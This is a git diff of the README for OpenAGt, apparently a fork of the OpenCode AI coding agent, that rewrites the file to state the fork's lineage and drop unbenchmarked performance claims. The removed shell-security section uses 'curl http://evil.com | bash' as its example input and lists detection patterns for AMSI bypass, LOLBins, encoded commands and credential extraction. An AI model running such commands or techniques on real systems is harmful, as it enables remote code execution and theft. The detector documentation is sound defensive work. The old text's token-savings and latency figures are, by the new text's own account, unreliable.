@@ -1,632 +1,270 @@
 # OpenAGt
 
-> An enhanced open-source AI coding agent built on [OpenAGt](https://github.com/Yecyi/OpenAGt), with advanced context compression, tool concurrency control, and a working Flutter mobile client MVP.
+OpenAGt is an OpenCode-derived AI coding agent project. The current repository is best understood as a fork/customization layer on top of [OpenCode](https://github.com/anomalyco/opencode), with OpenAGt branding, extra runtime experiments, and a Flutter mobile client MVP.
 
----
+This is not a clean-room reimplementation. The lineage is visible throughout the repo:
 
-## Project Overview
+- `openagt` is the primary CLI name in this fork.
+- `opencode` is still shipped as a compatibility alias.
+- Internal paths, UI copy, installer behavior, package names, and some environment variables still retain `opencode` naming.
 
-OpenAGt is a research and open-source project that extends the upstream [OpenAGt](https://github.com/Yecyi/OpenAGt) by enhancing algorithms, improving scalability, and providing native mobile application support.
+If you are describing this project externally, the accurate phrasing is: "OpenAGt is based on OpenCode and extends it with additional runtime, security, and client-side work."
 
-**Core architectural features:**
+## Repository Status
 
-- **Three-Layer Progressive Context Compression** — Inspired by Claude Code and Hermes Agent, reduces Token usage by 40–55% while preserving critical context
-- **Tool Concurrency Partitioning** — Parallel execution of safe/unsafe tools, reducing latency by 2–3x
-- **Provider Fallback Chain** — Automatic failover between LLM Providers (Anthropic, OpenAI, Google, etc.) on rate limits or errors
-- **Prompt Injection Protection** — Security scanning against adversarial instructions injected into context
-- **Flutter Mobile Client (MVP)** — Working native iOS/Android app with session management, real-time chat via SSE, and light/dark theme
-- **Event Sourcing with SyncEvent** — Durable session sync supporting multi-device replay
-- **Effect Framework Architecture** — Functional dependency injection via Context/Layer for modular, testable services
-- **MCP & LSP Integration** — Model Context Protocol and Language Server Protocol support for rich tooling
-- **PowerShell AST Security Analysis** — Deep command structure analysis using AST parsing for accurate threat detection
-- **Process Sandbox with Resource Limits** — Memory monitoring, file size limits, and Windows support for safe shell execution
-- **System Prompt Caching** — Static/dynamic prompt boundary separation for cache optimization
+This README describes the repository as it exists today, not every historical claim that has appeared in older documentation.
 
-**Technology stack:**
+What is present and actively relevant in this snapshot:
 
-| Layer | Technology |
-|-------|-----------|
-| Core Runtime | TypeScript + Bun |
-| Framework | Effect v4 (Functional Programming) |
-| AI SDK | Vercel AI SDK (25+ Providers) |
-| HTTP Server | Hono |
-| Database | SQLite (Drizzle ORM, WAL Mode) |
-| Web Framework | SolidJS |
-| Desktop | Tauri 2 + Electron |
-| Mobile | Flutter (MVP: chat, SSE, session list) |
-| Protocol | ACP (Agent Communication Protocol) |
-| Event System | SyncEvent (Event Sourcing) |
+| Path | Role |
+| --- | --- |
+| `packages/openagt` | Core agent runtime, CLI, Hono server, local persistence, tools, MCP/LSP/ACP integration |
+| `packages/app` | Solid/Vite web client |
+| `packages/sdk/js` | Generated JavaScript SDK used by the runtime and clients |
+| `packages/openagt_flutter` | Flutter mobile MVP |
+| `packages/console/*` | Console/control-plane services and web app |
+| `packages/web` | Astro/Starlight docs and site |
+| `packages/opencode` | Small leftover compatibility package, currently not the main runtime |
 
----
+Important caveat:
 
-## Table of Contents
+- The root `package.json` still contains stale references such as `packages/desktop-electron`, but that package is not present in this repo snapshot. Do not document desktop packaging as a verified local target unless that package is restored.
 
-- [About OpenAGt](#about-openagt)
-- [System Architecture](#system-architecture)
-  - [Core Module Dependency Graph](#core-module-dependency-graph)
-- [Core Algorithm Details](#core-algorithm-details)
-  - [1. Three-Layer Progressive Compression](#1-three-layer-progressive-compression)
-  - [2. Tool Concurrency Partitioning](#2-tool-concurrency-partitioning)
-  - [3. Provider Fallback Chain](#3-provider-fallback-chain)
-  - [4. Shell Security Analysis](#4-shell-security-analysis)
-- [Technology Stack](#technology-stack)
-- [Project Structure](#project-structure)
-- [Quick Start](#quick-start)
-  - [Environment Requirements](#environment-requirements)
-  - [Install and Run](#install-and-run)
-  - [Development Commands](#development-commands)
-- [Core Type System](#core-type-system)
-  - [MessageV2 Structure](#messagev2-structure)
-  - [SyncEvent Event Sourcing](#syncevent-event-sourcing)
-- [Extended Reading](#extended-reading)
-  - [Detailed Technical Analysis](#detailed-technical-analysis)
-  - [Package Documentation](#package-documentation)
-  - [Core Module Documentation](#core-module-documentation)
-  - [Design System](#design-system)
-- [References](#references)
-- [License](#license)
-- [Contributing](#contributing)
+## Codebase Lineage
 
----
+The codebase is structurally much closer to OpenCode than the old root README suggested.
 
-## About OpenAGt
+Evidence visible in the repo:
 
-OpenAGt is a research and open-source project that builds on [OpenAGt](https://github.com/Yecyi/OpenAGt), extending the original project through enhanced algorithms, improved scalability, and a working mobile client.
+- `packages/openagt/bin/opencode` exists as a compatibility launcher.
+- The installer creates both `openagt` and `opencode` symlinks.
+- The primary runtime still exposes `OPENCODE_*` compatibility environment variables alongside `OPENAGT_*`.
+- Large parts of the UI and configuration ecosystem still reference "OpenCode" in prose or identifiers.
+- `.opencode/` and `packages/opencode/` are still present in the repository.
 
-**Key enhancements over OpenAGt:**
+That does not make OpenAGt "just a rename". It is a fork with real local modifications, but the README should be explicit about the base project instead of implying a completely separate origin.
 
-- **Three-Layer Progressive Compression** — Layered context management inspired by Claude Code and Hermes Agent, reducing Token usage by 40–55% while preserving critical information
-- **Tool Concurrency Partitioning** — Safe/unsafe tool parallel execution management, reducing latency by 2–3x
-- **Provider Fallback Chain** — Automatic switching between LLM Providers (Anthropic, OpenAI, Google, etc.) on rate limits or server errors
-- **Prompt Injection Protection** — Security scanning against adversarial instructions in file contents and context
-- **Flutter Mobile Client (MVP)** — Working native app: session management, real-time SSE chat, light/dark theme
-- **Percolation Compression** — Hermes-style core member trait that preserves percolation-compressed context
-- **PowerShell AST Analysis** — Deep command structure parsing for accurate threat detection
-- **MCP Tool Quality Scoring** — Built-in quality assessment for MCP server tools
-- **Process Sandbox Resource Limits** — Memory monitoring, file size limits, and Windows support
-- **System Prompt Caching** — Static/dynamic boundary separation for cache optimization
+## Verified Technical Architecture
 
----
+### Core Runtime
 
-## System Architecture
+`packages/openagt` is the actual heart of the system. It contains:
 
-```
-┌─────────────────────────────────────────────────────────────────────────────┐
-│                           Client Layer (Clients)                            │
-│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐ │
-│  │   TUI   │  │   Web   │  │ Desktop │  │ Flutter │  │  ACP   │ │
-│  │  (CLI)  │  │ (Solid) │  │ (Tauri) │  │  Mobile │  │Protocol│ │
-│  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬───┘ │
-└────────┼──────────────┼──────────────┼──────────────┼──────────────┼──────┘
-         └──────────────┴──────────────┴──────────────┴──────────────┘
-                              │
-                       HTTP + SSE / WebSocket
-                              │
-┌─────────────────────────────────────────────────────────────────────────────┐
-│               OpenAGt Server (Hono + Effect Framework)                   │
-│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐            │
-│  │ Session  │  │   Tool   │  │ Provider │  │Compaction│            │
-│  │ Manager  │  │ Registry │  │ Manager  │  │  Engine  │            │
-│  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘            │
-│  ┌────┴─────┐  ┌────┴─────┐  ┌────┴─────┐  ┌────┴─────┐            │
-│  │   LSP   │  │   MCP   │  │Permission│  │   ACP   │            │
-│  │ Service │  │ Manager │  │  Engine │  │ Protocol│            │
-│  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘            │
-│  ┌────┴─────┐  ┌────┴─────┐  ┌────┴─────┐  ┌────┴─────┐            │
-│  │   Bus    │  │ Sandbox  │  │  Config  │  │   Sync   │            │
-│  │ (PubSub) │  │  Broker │  │  Service │  │  Event   │            │
-│  └──────────┘  └──────────┘  └──────────┘  └──────────┘            │
-└─────────────────────────────────────────────────────────────────────────────┘
-                              │
-                              │
-┌─────────────────────────────────────────────────────────────────────────────┐
-│                    SQLite (WAL Mode) + File System                        │
-│  ┌──────────┐  ┌──────────┐  ┌──────────┐                              │
-│  │  Message │  │  Session │  │  Event   │                              │
-│  │  Table   │  │  Table   │  │ Sequence │                              │
-│  └──────────┘  └──────────┘  └──────────┘                              │
-└─────────────────────────────────────────────────────────────────────────────┘
-```
+- the CLI entrypoint and command tree
+- the headless server built on Hono
+- session/message orchestration
+- tool registration and execution
+- model/provider loading
+- local SQLite storage and JSON-to-SQLite migration logic
+- permission, shell review, and sandbox-related logic
+- MCP, LSP, ACP, plugin, and agent integration
 
-### Core Module Dependency Graph
+The runtime is Bun-first, but it keeps some Bun/Node compatibility branches through import maps such as `#db`, `#pty`, and `#hono`.
 
-```
-┌─────────────────────────────────────────────────────────────────────────────┐
-│                         Effect Framework                                   │
-│  ┌──────────────────────────────────────────────────────────────────────┐ │
-│  │                  Runtime & Context System                          │ │
-│  │  ┌───────────────┐  ┌───────────────┐  ┌───────────────┐      │ │
-│  │  │ makeRuntime  │  │ InstanceState │  │   MemoMap     │      │ │
-│  │  └───────────────┘  └───────────────┘  └───────────────┘      │ │
-│  └──────────────────────────────────────────────────────────────────┘ │
-│                                    │                                     │
-│       ┌───────────────────────────┼───────────────────────────┐      │
-│       │                           │                           │      │
-│ �─────┴─────┐             ┌─────┴─────┐             ┌─────┴─────┐ │
-│ │  Provider  │             │  Session   │             │   Config   │ │
-│ │  Service   │             │  Service   │             │  Service   │ │
-│ │            │             │            │             │            │ │
-│ │┌─────────┐│             │┌─────────┐ │             │┌─────────┐ │ │
-│ ││25+ LLM ││             ││MessageV2│ │             ││ Agent   │ │ │
-│ ││Providers││             ││Compaction│ │             ││ Config  │ │ │
-│ ││Fallback ││             ││ Token   │ │             ││ Command │ │ │
-│ ││ Chain  ││             ││ Budget  │ │             ││ Model   │ │ │
-│ │└─────────┘│             │└─────────┘ │             │└─────────┘ │ │
-│ └───────────┘             └─────────────┘             └───────────┘ │
-│                                    │                                     │
-└────────────────────────────────────┼────────────────────────────────────┘
-                                     │
-      ┌──────────────────────────────┼──────────────────────────────┐
-      │                              │                              │
-┌─────┴─────┐              ┌─────┴─────┐              ┌─────┴─────┐
-│    Bus     │              │  Sandbox   │              │   Sync    │
-│  (PubSub)  │              │  Broker   │              │  Event    │
-│            │              │           │              │  Sourcing  │
-└────────────┘              └───────────┘              └───────────┘
-                                     │
-┌────────────────────────────────────┼────────────────────────────────────┐
-│                        Tool Execution Layer                             │
-│  ┌───────────┐              ┌───────────┐              ┌───────────┐ │
-│  │   Tool    │              │  Shell    │              │ Security  │
-│  │ Partition  │              │ Security  │              │  Scanner  │
-│  │           │              │           │              │           │
-│  │ Safe:     │              │┌─────────┐│              │┌─────────┐│ │
-│  │ read/grep/│              ││Command  ││              ││Injection││ │
-│  │ glob/web  │              ││Classifier││              ││Detection││ │
-│  │ fetch     │              │└─────────┘│              │└─────────┘│ │
-│  │ Unsafe:   │              │           │              │           │
-│  │ bash/edit/│              │           │              │           │
-│  │ write/task│              │           │              │           │
-│  └───────────┘              └───────────┘              └───────────┘ │
-└─────────────────────────────────────────────────────────────────────────────┘
-```
+### Tool Scheduling and Concurrency
 
----
+The codebase does implement tool concurrency control, but the accurate description is narrower than the older README claimed.
 
-## Core Algorithm Details
+What is implemented:
 
-### 1. Three-Layer Progressive Compression
+- `packages/openagt/src/tool/partition.ts` classifies a fixed set of tools as concurrency-safe.
+- Safe tools are currently `read`, `glob`, `grep`, `webfetch`, `codesearch`, `websearch`, `lsp`, `question`, and `skill`.
+- Unsafe tools such as `bash`, `edit`, `write`, `task`, `todo`, `plan`, and `apply_patch` are serialized.
+- `packages/openagt/src/session/prompt/tool-resolution.ts` adds path extraction and path-conflict blocking so overlapping file operations do not run at the same time.
 
-```
-Token Usage
-│
-│ 100% ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─
-│
-│                                    ████████████████████████████
-│ 0%  ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─
-│     Micro    Auto        Full          Blocking
-│     Compact  Compact     Compact       Limit
-│     ($0)     ($0)       (~$0.03-0.09)
-│     Simple   Memory      LLM Summary
-│     discard  discard
+What should not be overstated:
 
-Compression priority formula:
-priority = log(age_minutes + 1) × (11 - importance) + contentWeight × 0.5
+- This is not a full global DAG scheduler.
+- The repo does not currently provide reproducible benchmark data proving fixed `2x-3x` latency wins.
 
-Where:
-- age_minutes: logarithm of minutes since tool result
-- importance: tool importance weight (1–10, 10 = highest)
-- contentWeight: content retention exponent (based on content type)
-```
+So the README should describe this as "safe/unsafe tool partitioning with path-conflict checks", not as a universally optimized scheduler with hard performance guarantees.
 
-### 2. Tool Concurrency Partitioning
+### Provider Abstraction and Fallback
 
-```
-Tool call sequence: [read, glob, edit, bash, grep, write]
-                      │
-                      ▼
-        ┌─────────────────────────┐
-        │     ToolPartition        │
-        │ partitionToolCalls()     │
-        └───────────┬─────────────┘
-                    │
-      ┌─────────────┴─────────────┐
-      ▼                           ▼
-┌─────────────┐            ┌─────────────┐
-│ Safe Batch  │            │   Unsafe    │
-│ (parallel)  │            │  (serial)   │
-│ ┌─────────┐ │            │ ┌─────────┐ │
-│ │ read    │ │            │ │ edit    │ │
-│ │ glob    │ │            │ │ bash    │ │
-│ │ grep    │ │            │ │ write   │ │
-│ └─────────┘ │            │ │ task    │ │
-└─────────────┘            └─────────────┘
+The provider layer is real and reasonably substantial.
 
-Safe tools: read, glob, grep, webfetch, codesearch, websearch, lsp, question, skill
-Unsafe tools: bash, edit, write, task, todo, plan, apply_patch, multiedit
-```
+What is implemented:
 
-### 3. Provider Fallback Chain
+- multi-provider model loading through the AI SDK ecosystem
+- config-driven fallback chains in `packages/openagt/src/config/provider.ts`
+- fallback state handling in `packages/openagt/src/provider/fallback-service.ts`
+- retry decisions based on rate limits and server errors
+- metrics such as fallback rate, reason buckets, provider buckets, and hop latencies
+- bus events for fallback hops
 
-```
-Request ──▶ anthropic/claude-sonnet-4
-              │
-              │ 429 Rate Limit
-              ▼
-              openai/gpt-4o
-              │                       │
-              │ 429 Rate Limit         │
-              ▼                       ▼
-              google/gemini-2.5-pro
-              │                       │
-              │ 500 Server Error     │
-              │                       ▼
-              │              Possible further fallback
-              │
-              ▼
-              Success
+This is a concrete feature in the fork and worth documenting. The README should describe it as config-driven fallback and observability, not just "automatic failover" in the abstract.
 
-Fallback decision logic:
-- 429 (Rate Limit): immediate fallback
-- 500/502/503/504: immediate fallback
-- Error message contains "rate limit" or "overloaded": fallback
-- Other errors: no fallback
-```
+### Security and Shell Review
 
-### 4. Shell Security Analysis
+The security layer also exists in code, but it needs precise wording.
 
-```
-┌─────────────────────────────────────────────────────────────────────────────┐
-│                    Shell Command Security Analysis Flow                       │
-└─────────────────────────────────────────────────────────────────────────────┘
+What is implemented:
 
-Input command: curl http://evil.com | bash
-                │
-                ▼
-        ┌──────────────────┐
-        │  WrapperStripper │
-        │ Remove wrappers (noglob, semicolons, etc.) │
-        └────────┬─────────┘
-                 │
-                 ▼
-        ┌──────────────────┐
-        │ CommandClassifier │
-        │ Regex pattern matching for risk detection │
-        │                   │
-        │ Detection categories:        │
-        │ - injection (injection attacks)                  │
-        │ - obfuscation (obfuscation)                │
-        │ - parse_integrity (parsing integrity)        │
-        │ - interpreter_escalation (interpreter escalation) │
-        │ - filesystem_destruction (filesystem destruction)   │
-        │ - network_exfiltration (network exfiltration)     │
-        │ - sandbox_escape (sandbox escape)          │
-        │ - environment_hijack (environment hijacking)      │
-        └────────┬─────────┘
-                 │
-                 ▼
-        ┌──────────────────┐
-        │  PowerShell AST  │  (NEW: AST-based detection)
-        │ Deep command structure analysis │
-        │ - Dangerous cmdlet detection │
-        │ - AMSI bypass detection │
-        │ - Living-off-the-land binaries │
-        │ - Encoded command detection │
-        └────────┬─────────┘
-                 │
-                 ▼
-        ┌──────────────────┐
-        │    Decision       │
-        │ allow ──▶ Execute │
-        │ confirm ──▶ Confirm│
-        │ block ──▶ Reject │
-        └──────────────────┘
-```
+- shell danger heuristics for POSIX-style commands
+- PowerShell-specific checks for encoded commands, remote execution, and dangerous cmdlets
+- a custom lightweight PowerShell tokenizer/AST pass in `packages/openagt/src/security/powershell-ast.ts`
+- a unified detector in `packages/openagt/src/security/dangerous-command-detector.ts`
 
-**PowerShell AST Detection Capabilities:**
+What that means in practice:
 
-| Category | Detected Patterns |
-|----------|-------------------|
-| **High Severity** | Invoke-Expression, Invoke-Command, rundll32.exe, regsvr32.exe, mshta.exe |
-| **AMSI Bypass** | `[Ref].Assembly.GetType`, AmsiUtils |
-| **Encoded Commands** | `-enc`, `-EncodedCommand`, FromBase64String |
-| **Persistence** | schtasks.exe, Register-ScheduledTask, New-Service |
-| **Credentials** | ConvertFrom-SecureString, credential extraction patterns |
-```
+- the repo can flag patterns like `Invoke-Expression`, `Invoke-Command`, `-EncodedCommand`, AMSI bypass strings, and common LOLBins such as `rundll32.exe`, `regsvr32.exe`, and `mshta.exe`
+- this goes beyond plain regex matching
+- it is still a project-specific parser, not the official PowerShell parser or a formal sandbox proof
 
----
+That distinction matters. The README should present it as "heuristic command security analysis with a custom PowerShell AST layer", which is accurate and still useful.
 
-## Technology Stack
+### Context and Session Management
 
-| Component | Technology |
-|-----------|------------|
-| Core Runtime | TypeScript + Bun |
-| Framework | Effect v4 (Functional Programming) |
-| AI SDK | Vercel AI SDK (25+ Providers) |
-| HTTP Server | Hono |
-| Database | SQLite (Drizzle ORM, WAL Mode) |
-| Web Framework | SolidJS |
-| Desktop | Tauri 2 + Electron |
-| Mobile | Flutter (MVP: chat, SSE, session list) |
-| Terminal UI | @opentui/core + SolidJS |
-| Protocol | ACP (Agent Communication Protocol) |
-| Event System | SyncEvent (Event Sourcing) |
+The runtime contains compaction-related code under the session subsystem, including `micro`, `auto`, and `full` compaction strategies.
 
----
+What is safe to say:
 
-## Project Structure
+- the repo has multiple context-compaction paths
+- session/message state is a first-class subsystem
+- there is explicit logic for retries, overflow handling, summaries, memory, and tool-aware prompt assembly
 
-```
-openag/
-├── packages/
-│   ├── openagt/              # Core AI agent engine
-│   │   └── src/
-│   │       ├── session/       # Session management, messages, compaction
-│   │       │   ├── message-v2.ts    # Message model (Part/Info types)
-│   │       │   ├── compaction/      # Three-layer compaction engine
-│   │       │   │   ├── auto.ts       # AutoCompact + CircuitBreaker
-│   │       │   │   ├── importance.ts  # Tool importance calculation
-│   │       │   │   └── ...
-│   │       │   ├── prompt/          # Prompt assembly (NEW: modularized)
-│   │       │   │   ├── reminder.ts   # Reminder budget system
-│   │       │   │   ├── command.ts    # Command template processing
-│   │       │   │   ├── tool-scheduler.ts # Tool scheduling logic
-│   │       │   │   ├── tool-resolution.ts # Tool path resolution
-│   │       │   │   └── model-selection.ts # Model selection helpers
-│   │       │   └── session.ts        # Session Service
-│   │       │
-│   │       ├── provider/      # LLM Provider management
-│   │       │   ├── provider.ts # 25+ Provider loading
-│   │       │   ├── fallback.ts  # Fallback chain logic
-│   │       │   ├── error.ts     # Error type parsing
-│   │       │   └── schema.ts    # Provider/Model type definitions
-│   │       │
-│   │       ├── tool/          # Tool system
-│   │       │   ├── partition.ts # Safe/unsafe concurrency partitioning
-│   │       │   ├── registry.ts  # Tool definition registry
-│   │       │   ├── truncate.ts  # Result truncation
-│   │       │   └── bash.ts, edit.ts, read.ts, glob.ts, grep.ts ...
-│   │       │
-│   │       ├── security/      # Security protection
-│   │       │   ├── shell-security.ts  # Shell command analysis
-│   │       │   ├── command-classifier.ts # Risk pattern matching
-│   │       │   ├── wrapper-stripper.ts  # Wrapper removal
-│   │       │   ├── injection.ts   # Prompt injection detection
-│   │       │   ├── dangerous-command-detector.ts # Unified security detector
-│   │       │   ├── powershell-ast.ts # AST-based PowerShell analysis
-│   │       │   └── powershell.ts # PowerShell cmdlet detection
-│   │       │
-│   │       ├── bus/           # Event bus (PubSub)
-│   │       │   ├── index.ts    # Bus Service + Layer
-│   │       │   ├── bus-event.ts # Event definitions
-│   │       │   └── global.ts    # GlobalBus cross-process events
-│   │       │
-│   │       ├── sync/          # Event sourcing
-│   │       │   └── index.ts   # SyncEvent.run/replay
-│   │       │
-│   │       ├── sandbox/       # Sandboxed execution
-│   │       │   ├── broker.ts   # IPC Broker process management
-│   │       │   ├── policy.ts   # Sandbox policy parsing
-│   │       │   ├── process-sandbox.ts # Process limits & Windows support (NEW)
-│   │       │   └── types.ts   # Type definitions
-│   │       │
-│   │       ├── config/        # Configuration management
-│   │       │   ├── agent.ts   # Agent config
-│   │       │   ├── provider.ts # Provider config
-│   │       │   ├── command.ts # Command config
-│   │       │   └── ...
-│   │       │
-│   │       ├── effect/        # Effect Framework extensions
-│   │       │   ├── run-service.ts  # makeRuntime
-│   │       │   ├── instance-state.ts # ScopedCache per instance
-│   │       │   ├── memo-map.ts     # Layer deduplication
-│   │       │   └── ...
-│   │       │
-│   │       ├── storage/       # SQLite database
-│   │       │   ├── schema.sql.ts   # Drizzle Schema
-│   │       │   └── index.ts        # Storage Service
-│   │       │
-│   │       ├── acp/           # ACP protocol
-│   │       ├── lsp/           # LSP service (language intelligence)
-│   │       ├── mcp/           # MCP manager (Model Context Protocol)
-│   │       ├── permission/    # Permission engine
-│   │       └── ...
-│   │
-│   ├── openagt_flutter/     # Flutter mobile client (MVP: chat, SSE, session list)
-│   ├── app/                  # SolidJS Web application
-│   ├── desktop/              # Tauri desktop application
-│   ├── sdk/                  # Client SDK
-│   ├── docs/                  # Mintlify documentation
-│   └── enterprise/            # Enterprise edition
-│
-├── docs/
-│   └── TECHNICAL_ANALYSIS_REPORT.md  # Full technical analysis
-│
-└── Code Reference/
-    ├── CC Source Code/   # Claude Code reference implementation
-    └── hermes-agent/     # Hermes Agent reference
-```
+What should not be claimed without benchmarks:
 
----
+- fixed token savings such as `40%-55%`
+- fixed cost reductions
+- guaranteed quality retention under all workloads
+
+If you want those numbers in the future, add a benchmark document and link it from the README.
+
+### Clients
+
+The repository currently contains multiple client surfaces:
+
+- CLI/TUI through `packages/openagt`
+- Web app through `packages/app`
+- Console web surfaces through `packages/console/app`
+- Flutter mobile MVP through `packages/openagt_flutter`
+
+The Flutter app is real code, not just a placeholder. The package includes API, SSE, chat, session, and theme layers. Still, it should be documented as an MVP client, not as a feature-complete mobile product.
 
 ## Quick Start
 
-### Environment Requirements
+### Prerequisites
 
-- [Bun](https://bun.sh) 1.0+ or Node.js 20+
+- Bun 1.3+
 - Git
+- Flutter 3.41+ if you want to run the mobile client
 
-### Install and Run
+### Fresh Clone Setup
+
+After a fresh clone, generate the JavaScript SDK before trying to start the CLI or server.
 
 ```bash
-# Clone the repository
-git clone https://github.com/Yecyi/OpenAGt.git
-cd OpenAGt
-
-# Install dependencies
 bun install
-
-# Start the server
-bun run dev
-
-# Start the TUI in another terminal
-bun run openag
+bun run --cwd packages/sdk/js script/build.ts
 ```
 
-### Development Commands
+This step is required because `packages/openagt` imports generated SDK files under `packages/sdk/js/src/v2/gen`.
+
+### Run the Core CLI
 
 ```bash
-# Type checking
+bun run --cwd packages/openagt src/index.ts --help
+bun run --cwd packages/openagt src/index.ts
+```
+
+Compatibility note:
+
+- `openagt` is the preferred command name in this fork.
+- `opencode` still exists as a compatibility entrypoint.
+
+### Run the Headless Server
+
+```bash
+bun run --cwd packages/openagt src/index.ts serve
+```
+
+### Run the Web Client
+
+```bash
+bun run --cwd packages/app dev
+```
+
+### Run the Docs Site
+
+```bash
+bun run --cwd packages/web dev
+```
+
+### Run the Flutter Mobile MVP
+
+```bash
+cd packages/openagt_flutter
+flutter pub get
+flutter run
+```
+
+## Development Workflow
+
+### SDK Regeneration
+
+Whenever the API surface changes, regenerate the JS SDK:
+
+```bash
+bun run --cwd packages/sdk/js script/build.ts
+```
+
+### Type Checking
+
+Per repository guidance, run type checking from package directories instead of invoking `tsc` directly:
+
+```bash
+cd packages/openagt
 bun typecheck
+```
 
-# Linting
-bun lint
+Other useful package-local checks:
 
-# Run all tests
+```bash
+cd packages/app
+bun typecheck
+```
+
+### Tests
+
+Do not run tests from the repo root. The root `test` script intentionally exits with `do not run tests from root`.
+
+Run tests from the relevant package instead:
+
+```bash
+cd packages/openagt
 bun test
-
-# Run specific test suite
-bun test test/security/
-bun test test/mcp/
-bun test test/session/
-
-# Run tests with coverage
-bun test --coverage
 ```
 
----
+## Recommended README Positioning
 
-## Core Type System
+If this project is being presented to users, contributors, or investors, the README should emphasize these points:
 
-### MessageV2 Structure
+1. OpenAGt is based on OpenCode, not independent from it.
+2. The repo contains meaningful fork-specific work in provider fallback, shell security, scheduling, and mobile/client experimentation.
+3. Some naming and package layout are still in transition, so compatibility aliases and OpenCode references remain intentional or unfinished.
+4. Performance claims should be benchmark-backed before they appear in the README.
 
-```
-Message
-├── User
-│   ├── id, sessionID
-│   ├── role: "user"
-│   ├── format: OutputFormat
-│   ├── system?, tools?
-│   └── summary?, agent, model
-│
-├── Assistant
-│   ├── id, sessionID
-│   ├── role: "assistant"
-│   ├── modelID, providerID
-│   ├── error?, finish?
-│   ├── cost, tokens
-│   └── parentID, path, summary
-│
-└── Parts[]
-    ├── TextPart        # Text content
-    ├── ReasoningPart    # Reasoning process
-    ├── ToolPart        # Tool call
-    │   ├── status: pending | running | completed | error
-    │   ├── callID, tool
-    │   └── state: ToolState*
-    ├── FilePart        # File/media
-    ├── SnapshotPart    # Snapshot
-    ├── CompactionPart  # Compaction marker
-    └── StepFinishPart  # Step completion
-```
+## Known Documentation Corrections
 
-### SyncEvent Event Sourcing
+These are the main corrections from the older README:
 
-```
-┌─────────────────────────────────────────────────────────────────────────────┐
-│                         SyncEvent Definition                                │
-└─────────────────────────────────────────────────────────────────────────────┘
-SyncEvent.define({
-  type: "session.created",
-  version: 1,
-  aggregate: "sessionID",  // Aggregate root
-  schema: z.object({ sessionID, info })
-})
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────────────────┐
-│                         Event Lifecycle                                     │
-└─────────────────────────────────────────────────────────────────────────────┘
-SyncEvent.run(Created, data)
-         │
-         ▼
-Database.transaction (IMMEDIATE)
-         │
-         ▼
-projector(db, data) ──▶ State mutation
-         │
-         ▼
-EventSequenceTable ──▶ seq = last + 1
-         │
-         ▼
-EventTable ──▶ Persist event
-         │
-         ▼
-Bus.publish ──▶ Global event notification
-```
+- Replace self-referential "built on OpenAGt" wording with explicit OpenCode lineage.
+- Remove or soften unverified numeric claims about token savings and latency improvements.
+- Do not present desktop packaging as part of the verified local repo when the corresponding package is missing.
+- Document the required SDK generation step for fresh clones.
+- Clarify that `openagt` and `opencode` both exist, with `opencode` kept for compatibility.
+- Treat the Flutter client as an MVP, not as a fully complete cross-platform product.
 
----
+## Further Reading
 
-## Extended Reading
-
-### Detailed Technical Analysis
-
-For a complete architectural overview, algorithm enhancements, and Flutter feasibility study, refer to:
-
-- [docs/TECHNICAL_ANALYSIS_REPORT.md](./docs/TECHNICAL_ANALYSIS_REPORT.md)
-
-Topics covered:
-- Architecture comparison (OpenAGt vs Claude Code vs Hermes Agent)
-- Three-layer compaction algorithm design
-- Tool concurrency partitioning implementation
-- Provider fallback chain design
-- Security threat modeling
-- Performance benchmarks
-- Flutter mobile application feasibility
-- Implementation roadmap
-
-### Package Documentation
-
-| Package | Description |
-|---------|-------------|
-| [packages/openagt/README.md](./packages/openagt/README.md) | Core AI agent engine |
-| [packages/openagt_flutter/README.md](./packages/openagt_flutter/README.md) | Flutter mobile client (MVP) |
-| [packages/app/README.md](./packages/app/README.md) | SolidJS Web application |
-| [packages/docs/README.md](./packages/docs/README.md) | Mintlify documentation site |
-| [packages/web/README.md](./packages/web/README.md) | Astro Starlight documentation |
-| [packages/enterprise/README.md](./packages/enterprise/README.md) | Enterprise features |
-
-### Core Module Documentation
-
-| Module | Description |
-|--------|-------------|
-| [packages/openagt/src/effect/README.md](./packages/openagt/src/effect/README.md) | Effect Framework integration |
-| [packages/openagt/src/acp/README.md](./packages/openagt/src/acp/README.md) | ACP protocol implementation |
-| [packages/openagt/src/sync/README.md](./packages/openagt/src/sync/README.md) | SyncEvent event sourcing |
-| [packages/openagt/src/provider/README.md](./packages/openagt/src/provider/README.md) | LLM Provider abstraction |
-| [packages/openagt/src/bus/README.md](./packages/openagt/src/bus/README.md) | Bus event bus (PubSub) |
-| [packages/openagt/src/mcp/README.md](./packages/openagt/src/mcp/README.md) | MCP server management |
-| [packages/openagt/src/lsp/README.md](./packages/openagt/src/lsp/README.md) | LSP server and diagnostics |
-| [packages/openagt/src/sandbox/README.md](./packages/openagt/src/sandbox/README.md) | Process sandbox & resource limits |
-| [packages/openagt/src/security/README.md](./packages/openagt/src/security/README.md) | Security detection modules |
-
-### Design System
-
-- [OpenAGt Theme Design/](OpenAGt%20Theme%20Design/)
-
----
-
-## References
-
-- [OpenAGt](https://github.com/Yecyi/OpenAGt) — Base project
-- [Hermes Agent](https://github.com/NousResearch/hermes-agent) — Reference implementation
-- [Vercel AI SDK](https://sdk.vercel.ai) — AI Provider abstraction
-- [Effect Framework](https://effect.website) — Functional programming
-- [Drizzle ORM](https://orm.drizzle.team) — SQLite ORM
-- [ACP Specification](https://agentclientprotocol.com/) — Agent communication protocol
-
----
+- [OpenCode upstream](https://github.com/anomalyco/opencode)
+- [Technical analysis report](./docs/TECHNICAL_ANALYSIS_REPORT.md)
+- [Core runtime package](./packages/openagt/README.md)
+- [Web app](./packages/app/README.md)
+- [JavaScript SDK](./packages/sdk/js/package.json)
+- [Flutter client](./packages/openagt_flutter/pubspec.yaml)
 
 ## License
 
-MIT License — see [LICENSE](./LICENSE)
-
----
-
-## Contributing
-
-Contributions are welcome! Please read the [Contributing Guide](./CONTRIBUTING.md) before submitting PRs.
-
----
-
